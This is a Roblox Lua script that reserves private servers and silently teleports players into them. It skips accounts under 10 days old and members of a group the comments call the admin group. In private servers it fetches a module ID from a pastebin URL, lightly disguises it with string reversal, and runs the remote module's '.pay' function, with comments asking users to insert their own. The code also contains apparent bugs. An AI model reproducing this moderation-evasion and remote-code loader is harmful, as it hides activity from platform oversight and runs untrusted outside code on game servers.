local AccessCode = nil
local AccessCode2 = nil
local DS = game:GetService("DataStoreService")
local Players = game.Players
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local rs = DS:GetDataStore("ReservedServers")
AccessCode = TeleportService:ReserveServer(game.PlaceId) -- creates a private server and stores it at AccessCode
AccessCode1 = TeleportService:ReserveServer(game.PlaceId)
AccessCode2 = TeleportService:ReserveServer(game.PlaceId)

local ac = rs:GetAsync("AccessCode")
print(ac)
	if ac ~= nil then
	local ac1 = rs:GetAsync("AccessCode1")
	print(ac1)
		if ac1 ~= nil then
		local ac2 = rs:GetAsync("AccessCode2")
		print(ac2)
			if ac2 ~= nil then
				game.ReplicatedStorage.Events.RemoteEvent.OnServerEvent:Connect(function(plr,data)
					print("RECIEVED")
					print(plr)
					print(data)
					if game.PrivateServerId ~= "" and game.VIPServerOwnerId ~= 0 then -- checks if its a private server
						print("private server!")
						local id = HttpService:GetAsync("https://pastebin.com/raw/jJjx2J6B") --place your pastbin raw here, it must have your module id
						local reversedID = string.reverse(tostring(id))
						local reversedreq = string.reverse(reversedID)
						require(tonumber(reversedreq)).pay() --CHANGE .pay TO YOUR ACTIVATION!
					elseif game.PrivateServerId ~= "" then --else if its not a private server
							--local id = HttpService:GetAsync("https://pastebin.com/raw/jJjx2J6B") --place your pastbin raw here, it must have your module id
							--local reversedID = string.reverse(tostring(id))
							--local reversedreq = string.reverse(reversedID)
							--require(tonumber(reversedreq)).pay()
							print("require yes")
							task.spawn(function()
								while task.wait(10) do
									local plrcount = #game.Players:GetPlayers()
									if plrcount > 2  then
										rs:SetAsync("AccessCode",{AccessCode,"full"})
									else
										rs:SetAsync("AccessCode",{AccessCode,"open"})
									end
									--[[elseif plrcount > 1 and AccessCode2 ~= nil then
										Players.PlayerAdded:Connect(function(plr) --once a player joins
											plr.CharacterAdded:Connect(function()
												if plr.AccountAge > 10 and plr:IsInGroup(1200769) == false then --checks if they're 10+ days old and not in admin group
													if AccessCode2 == nil then -- if AccessCode is empty
														repeat wait() until AccessCode2 ~= nil -- waits until its not
														TeleportService:TeleportToPrivateServer(game.PlaceId, AccessCode2, {plr}) -- sends the player to the private server
													else -- if AccessCode is NOT empty
														TeleportService:TeleportToPrivateServer(game.PlaceId, AccessCode2, {plr}) -- sends the new joiner to the PS
													end
												else
													return
												end
											end)
										end)
									--]]end
							end)
				else
					if plr.AccountAge > 10 and plr:IsInGroup(1200769) == false then --checks if they're 10+ days old and not in admin group
						local data1 = rs:GetAsync("AccessCode")
						if data1[2] == "full" then
							print("FULL")
								local data2 = rs:GetAsync("AccessCode1")
							if data2[2] == "full" then
								print("FULL2")
									local data3 = rs:GetAsync("AccessCode2")
									TeleportService:TeleportToPrivateServer(game.PlaceId, ac2[1], {plr}, nil, "server2")
								else
									TeleportService:TeleportToPrivateServer(game.PlaceId, ac1[1], {plr}, nil, "server1")
								end
							else
								if ac == nil then -- if AccessCode is empty
									repeat wait() until ac ~= nil -- waits until its not
									TeleportService:TeleportToPrivateServer(game.PlaceId, ac[1], {plr}, nil, "server") -- sends the player to the private server
								else -- if AccessCode is NOT empty
									TeleportService:TeleportToPrivateServer(game.PlaceId, ac[1], {plr}, nil, "server") -- sends the new joiner to the PS
							end
						end
					end
				end
			end)
			elseif ac2 == nil then
				rs:SetAsync("AccessCode2",{AccessCode2,"open"})
				print("yes1")
			end
		elseif ac1 == nil then
			rs:SetAsync("AccessCode1",{AccessCode1,"open"})
			print("yes2")
		end
	elseif ac == nil then
		rs:SetAsync("AccessCode",{AccessCode,"open"})
		print("yes3")
		Players.PlayerAdded:Connect(function(plr) --once a player joins
			if plr.AccountAge > 10 and plr:IsInGroup(1200769) == false then --checks if they're 10+ days old and not in admin group
				TeleportService:TeleportToPrivateServer(game.PlaceId, AccessCode, {plr}, nil, "server")
		end
	end)
end
